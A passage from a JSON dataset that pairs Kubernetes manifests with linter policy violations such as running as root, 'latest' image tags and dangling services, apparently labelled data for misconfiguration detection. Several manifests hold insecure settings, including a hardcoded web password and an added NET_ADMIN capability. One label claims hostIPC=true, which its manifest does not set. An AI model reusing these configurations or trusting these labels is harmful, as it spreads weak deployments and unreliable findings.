    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-server\nspec:\n  selector:\n    matchLabels:\n      app: config-server\n  template:\n    metadata:\n      labels:\n        app: config-server\n    spec:\n      containers:\n      - name: config-server\n        image: hands-on/config-server:v1\n        env:\n        - name: LOGGING_LEVEL_ROOT\n          value: WARN\n        - name: MANAGEMENT_ENDPOINTS_WEB_EXPOSURE_INCLUDE\n          value: health,info\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"config-server\" has cpu request 0"
  },
  {
    "id": "9858",
    "manifest_path": "data/manifests/the_stack_sample/sample_3782.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: xidunku-xode-server\n  labels:\n    app: xidunku-xode-server\nspec:\n  volumes:\n  - name: hostdir\n    hostPath:\n      path: /tmp\n      type: Directory\n  containers:\n  - name: code-server\n    image: localhost:32000/xidunku-xode-server\n    ports:\n    - name: web\n      containerPort: 8443\n    volumeMounts:\n    - name: hostdir\n      mountPath: /home/coder/project\n    resources:\n      limits:\n        memory: 512Mi\n        cpu: 500m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"code-server\" is using an invalid container image, \"localhost:32000/xidunku-xode-server\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9859",
    "manifest_path": "data/manifests/the_stack_sample/sample_3782.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: xidunku-xode-server\n  labels:\n    app: xidunku-xode-server\nspec:\n  volumes:\n  - name: hostdir\n    hostPath:\n      path: /tmp\n      type: Directory\n  containers:\n  - name: code-server\n    image: localhost:32000/xidunku-xode-server\n    ports:\n    - name: web\n      containerPort: 8443\n    volumeMounts:\n    - name: hostdir\n      mountPath: /home/coder/project\n    resources:\n      limits:\n        memory: 512Mi\n        cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"code-server\" does not have a read-only root file system"
  },
  {
    "id": "9860",
    "manifest_path": "data/manifests/the_stack_sample/sample_3782.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: xidunku-xode-server\n  labels:\n    app: xidunku-xode-server\nspec:\n  volumes:\n  - name: hostdir\n    hostPath:\n      path: /tmp\n      type: Directory\n  containers:\n  - name: code-server\n    image: localhost:32000/xidunku-xode-server\n    ports:\n    - name: web\n      containerPort: 8443\n    volumeMounts:\n    - name: hostdir\n      mountPath: /home/coder/project\n    resources:\n      limits:\n        memory: 512Mi\n        cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"code-server\" is not set to runAsNonRoot"
  },
  {
    "id": "9861",
    "manifest_path": "data/manifests/the_stack_sample/sample_3782.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: xidunku-xode-server\n  labels:\n    app: xidunku-xode-server\nspec:\n  volumes:\n  - name: hostdir\n    hostPath:\n      path: /tmp\n      type: Directory\n  containers:\n  - name: code-server\n    image: localhost:32000/xidunku-xode-server\n    ports:\n    - name: web\n      containerPort: 8443\n    volumeMounts:\n    - name: hostdir\n      mountPath: /home/coder/project\n    resources:\n      limits:\n        memory: 512Mi\n        cpu: 500m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"code-server\" has cpu request 0"
  },
  {
    "id": "9862",
    "manifest_path": "data/manifests/the_stack_sample/sample_3783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Germany/Berlin\n        - name: WEBPASSWORD\n          value: pihole\n        - name: ServerIP\n          value: localhost\n        - name: dns\n          value: 1.1.1.1\n        image: pihole/pihole:latest\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 53\n        - containerPort: 53\n          protocol: UDP\n        - containerPort: 67\n          protocol: UDP\n        - containerPort: 80\n        - containerPort: 443\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        volumeMounts:\n        - mountPath: /etc/pihole/\n          name: pihole-config\n        - mountPath: /etc/dnsmasq.d/\n          name: pihole-dnscfg\n      volumes:\n      - name: pihole-config\n        persistentVolumeClaim:\n          claimName: pihole-config\n      - name: pihole-dnscfg\n        persistentVolumeClaim:\n          claimName: pihole-dnscfg\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"pihole\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "9863",
    "manifest_path": "data/manifests/the_stack_sample/sample_3783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Germany/Berlin\n        - name: WEBPASSWORD\n          value: pihole\n        - name: ServerIP\n          value: localhost\n        - name: dns\n          value: 1.1.1.1\n        image: pihole/pihole:latest\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 53\n        - containerPort: 53\n          protocol: UDP\n        - containerPort: 67\n          protocol: UDP\n        - containerPort: 80\n        - containerPort: 443\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        volumeMounts:\n        - mountPath: /etc/pihole/\n          name: pihole-config\n        - mountPath: /etc/dnsmasq.d/\n          name: pihole-dnscfg\n      volumes:\n      - name: pihole-config\n        persistentVolumeClaim:\n          claimName: pihole-config\n      - name: pihole-dnscfg\n        persistentVolumeClaim:\n          claimName: pihole-dnscfg\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pihole\" is using an invalid container image, \"pihole/pihole:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9864",
    "manifest_path": "data/manifests/the_stack_sample/sample_3783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Germany/Berlin\n        - name: WEBPASSWORD\n          value: pihole\n        - name: ServerIP\n          value: localhost\n        - name: dns\n          value: 1.1.1.1\n        image: pihole/pihole:latest\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 53\n        - containerPort: 53\n          protocol: UDP\n        - containerPort: 67\n          protocol: UDP\n        - containerPort: 80\n        - containerPort: 443\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        volumeMounts:\n        - mountPath: /etc/pihole/\n          name: pihole-config\n        - mountPath: /etc/dnsmasq.d/\n          name: pihole-dnscfg\n      volumes:\n      - name: pihole-config\n        persistentVolumeClaim:\n          claimName: pihole-config\n      - name: pihole-dnscfg\n        persistentVolumeClaim:\n          claimName: pihole-dnscfg\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pihole\" does not have a read-only root file system"
  },
  {
    "id": "9865",
    "manifest_path": "data/manifests/the_stack_sample/sample_3783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Germany/Berlin\n        - name: WEBPASSWORD\n          value: pihole\n        - name: ServerIP\n          value: localhost\n        - name: dns\n          value: 1.1.1.1\n        image: pihole/pihole:latest\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 53\n        - containerPort: 53\n          protocol: UDP\n        - containerPort: 67\n          protocol: UDP\n        - containerPort: 80\n        - containerPort: 443\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        volumeMounts:\n        - mountPath: /etc/pihole/\n          name: pihole-config\n        - mountPath: /etc/dnsmasq.d/\n          name: pihole-dnscfg\n      volumes:\n      - name: pihole-config\n        persistentVolumeClaim:\n          claimName: pihole-config\n      - name: pihole-dnscfg\n        persistentVolumeClaim:\n          claimName: pihole-dnscfg\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pihole\" is not set to runAsNonRoot"
  },
  {
    "id": "9866",
    "manifest_path": "data/manifests/the_stack_sample/sample_3783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: pihole\n  name: pihole\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pihole\n  template:\n    metadata:\n      labels:\n        app: pihole\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Germany/Berlin\n        - name: WEBPASSWORD\n          value: pihole\n        - name: ServerIP\n          value: localhost\n        - name: dns\n          value: 1.1.1.1\n        image: pihole/pihole:latest\n        imagePullPolicy: IfNotPresent\n        name: pihole\n        ports:\n        - containerPort: 53\n        - containerPort: 53\n          protocol: UDP\n        - containerPort: 67\n          protocol: UDP\n        - containerPort: 80\n        - containerPort: 443\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        volumeMounts:\n        - mountPath: /etc/pihole/\n          name: pihole-config\n        - mountPath: /etc/dnsmasq.d/\n          name: pihole-dnscfg\n      volumes:\n      - name: pihole-config\n        persistentVolumeClaim:\n          claimName: pihole-config\n      - name: pihole-dnscfg\n        persistentVolumeClaim:\n          claimName: pihole-dnscfg\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pihole\" has cpu request 0"
  },
  {
    "id": "9867",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "host-ipc",
    "violation_text": "resource shares host's IPC namespace (via hostIPC=true)."
  },
  {
    "id": "9868",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9869",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mlperf-inference-container\" is using an invalid container image, \"aferikoglou/mlperf-inference:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9870",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mlperf-inference-container\" does not have a read-only root file system"
  },
  {
    "id": "9871",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mlperf-inference-container\" is not set to runAsNonRoot"
  },
  {
    "id": "9872",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mlperf-inference-container\" has cpu request 0"
  },
  {
    "id": "9873",
    "manifest_path": "data/manifests/the_stack_sample/sample_3784.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-4\nspec:\n  template:\n    metadata:\n      labels:\n        GPU_MEM_REQ: '24479'\n      name: tf-ssdmobilenet-default-1024-4-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mlperf-inference-container\" has memory limit 0"
  },
  {
    "id": "9874",
    "manifest_path": "data/manifests/the_stack_sample/sample_3786.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: prometheus\n    app.kubernetes.io/name: prometheus\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: v2.22.1\n    prometheus: k8s\n  name: prometheus-k8s\n  namespace: monitoring\nspec:\n  ports:\n  - name: web\n    port: 9090\n    targetPort: web\n  selector:\n    app: prometheus\n    app.kubernetes.io/component: prometheus\n    app.kubernetes.io/name: prometheus\n    app.kubernetes.io/part-of: kube-prometheus\n    prometheus: k8s\n  sessionAffinity: ClientIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:prometheus app.kubernetes.io/component:prometheus app.kubernetes.io/name:prometheus app.kubernetes.io/part-of:kube-prometheus prometheus:k8s])"
  },
  {
    "id": "9875",
    "manifest_path": "data/manifests/the_stack_sample/sample_3790.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/name: argocd-server-metrics\n    app.kubernetes.io/part-of: argocd\n  name: argocd-server-metrics\n  namespace: argocd-system\nspec:\n  ports:\n  - name: metrics\n    port: 8083\n    protocol: TCP\n    targetPort: 8083\n  selector:\n    app.kubernetes.io/name: argocd-server\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:argocd-server])"
  },
  {
    "id": "9876",
    "manifest_path": "data/manifests/the_stack_sample/sample_3791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opengauss-playground-backend\n  namespace: opengauss-playground-backend-test\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: opengauss-playground-backend\n  template:\n    metadata:\n      labels:\n        app: opengauss-playground-backend\n    spec:\n      containers:\n      - name: opengauss-playground-backend\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/opengauss-playground-backend-test:8f05cabf3ff6b16520fc8d7a4365ac225961f5e0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-username\n        - name: DB_PWD\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-passwd\n        - name: DB_URI\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-uri\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-name\n        - name: AES_KEY\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: aes-key\n        - name: CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: gitee-client-secret\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: gitee-client-id\n        - name: OAUTH2_CALLBACK\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: oauth2-callback\n        - name: USERPOOL_ID\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: userpool-id\n        - name: USERPOOL_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: userpool-secret\n        - name: CONTAINER_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: container-timeout\n        - name: TEMPLATE_PATH\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: template_path\n        - name: TZ\n          value: Asia/Shanghai\n        - name: COURSE_URL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: course_url\n        - name: CHAPTER_URL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: chapter_url\n        - name: CHAPTER_DETAIL_URL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: chapter_detail_url\n        - name: CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: contact_email\n        - name: RUN_MODE\n          value: prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 1500m\n            memory: 3000Mi\n          limits:\n            cpu: 1500m\n            memory: 3000Mi\n        volumeMounts:\n        - mountPath: /opt/app/statisticslog\n          name: static-log-data\n      volumes:\n      - name: static-log-data\n        persistentVolumeClaim:\n          claimName: cce-obs-opengauss-playground-manager\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"opengauss-playground-backend\" does not have a read-only root file system"
  },
  {
    "id": "9877",
    "manifest_path": "data/manifests/the_stack_sample/sample_3791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: opengauss-playground-backend\n  namespace: opengauss-playground-backend-test\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: opengauss-playground-backend\n  template:\n    metadata:\n      labels:\n        app: opengauss-playground-backend\n    spec:\n      containers:\n      - name: opengauss-playground-backend\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/opengauss-playground-backend-test:8f05cabf3ff6b16520fc8d7a4365ac225961f5e0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-username\n        - name: DB_PWD\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-passwd\n        - name: DB_URI\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-uri\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: db-name\n        - name: AES_KEY\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: aes-key\n        - name: CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: gitee-client-secret\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: gitee-client-id\n        - name: OAUTH2_CALLBACK\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: oauth2-callback\n        - name: USERPOOL_ID\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: userpool-id\n        - name: USERPOOL_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: userpool-secret\n        - name: CONTAINER_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: container-timeout\n        - name: TEMPLATE_PATH\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: template_path\n        - name: TZ\n          value: Asia/Shanghai\n        - name: COURSE_URL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: course_url\n        - name: CHAPTER_URL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: chapter_url\n        - name: CHAPTER_DETAIL_URL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: chapter_detail_url\n        - name: CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: opengauss-playground-backend-secrets\n              key: contact_email\n        - name: RUN_MODE\n          value: prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 1500m\n            memory: 3000Mi\n          limits:\n            cpu: 1500m\n            memory: 3000Mi\n        volumeMounts:\n        - mountPath: /opt/app/statisticslog\n          name: static-log-data\n      volumes:\n      - name: static-log-data\n        persistentVolumeClaim:\n          claimName: cce-obs-opengauss-playground-manager\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"opengauss-playground-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "9878",
    "manifest_path": "data/manifests/the_stack_sample/sample_3792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvc-demo-pod\nspec:\n  containers:\n  - name: frontend\n    image: nginx\n    volumeMounts:\n    - mountPath: /var/www/html\n      name: pvc-demo-volume\n  volumes:\n  - name: pvc-demo-volume\n    persistentVolumeClaim:\n      claimName: hello-web-disk\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"frontend\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9879",
    "manifest_path": "data/manifests/the_stack_sample/sample_3792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvc-demo-pod\nspec:\n  containers:\n  - name: frontend\n    image: nginx\n    volumeMounts:\n    - mountPath: /var/www/html\n      name: pvc-demo-volume\n  volumes:\n  - name: pvc-demo-volume\n    persistentVolumeClaim:\n      claimName: hello-web-disk\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "9880",
    "manifest_path": "data/manifests/the_stack_sample/sample_3792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvc-demo-pod\nspec:\n  containers:\n  - name: frontend\n    image: nginx\n    volumeMounts:\n    - mountPath: /var/www/html\n      name: pvc-demo-volume\n  volumes:\n  - name: pvc-demo-volume\n    persistentVolumeClaim:\n      claimName: hello-web-disk\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "9881",
    "manifest_path": "data/manifests/the_stack_sample/sample_3792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvc-demo-pod\nspec:\n  containers:\n  - name: frontend\n    image: nginx\n    volumeMounts:\n    - mountPath: /var/www/html\n      name: pvc-demo-volume\n  volumes:\n  - name: pvc-demo-volume\n    persistentVolumeClaim:\n      claimName: hello-web-disk\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"frontend\" has cpu request 0"
  },
  {
    "id": "9882",
    "manifest_path": "data/manifests/the_stack_sample/sample_3792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvc-demo-pod\nspec:\n  containers:\n  - name: frontend\n    image: nginx\n    volumeMounts:\n    - mountPath: /var/www/html\n      name: pvc-demo-volume\n  volumes:\n  - name: pvc-demo-volume\n    persistentVolumeClaim:\n      claimName: hello-web-disk\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"frontend\" has memory limit 0"
  },
  {
    "id": "9883",
    "manifest_path": "data/manifests/the_stack_sample/sample_3795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  namespace: kube-system\n  name: etcd-server-svc\n  labels:\n    k8s-app: etcd-server\n    prom-target: etcd\n    component: prometheus\n    task: scrape\n  annotations:\n    prometheus.io/scrape: 'true'\n    prometheus.io/port: '4001'\nspec:\n  clusterIP: None\n  ports:\n  - name: etcd-server\n    port: 4001\n  selector:\n    k8s-app: etcd-server\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:etcd-server])"
  },
  {
    "id": "9884",
    "manifest_path": "data/manifests/the_stack_sample/sample_3796.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: site\n  namespace: project-starter\n  labels:\n    app: site\nspec:\n  ports:\n  - name: http\n    port: 3000\n    targetPort: http\n  selector:\n    app: site\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:site])"
  },
  {
    "id": "9885",
    "manifest_path": "data/manifests/the_stack_sample/sample_3797.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongodb-express\n  namespace: spoon\n  labels:\n    app: mongodb-express\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8081\n  selector:\n    app: mongodb-express\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mongodb-express])"
  },
  {
    "id": "9886",
    "manifest_path": "data/manifests/the_stack_sample/sample_3798.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job-complete-annotation-whitelist\n  namespace: test\nspec:\n  template:\n    metadata:\n      name: job-complete\n      annotations:\n        admission.validation.avast.com/readonly-rootfs-containers-whitelist: sleep\n    spec:\n      containers:\n      - name: sleep\n        image: tutum/curl\n        command:\n        - /bin/sleep\n        - 5m\n        resources:\n          requests:\n            cpu: 100m\n            memory: 5M\n          limits:\n            cpu: 200m\n            memory: 30M\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9887",
    "manifest_path": "data/manifests/the_stack_sample/sample_3798.yaml",
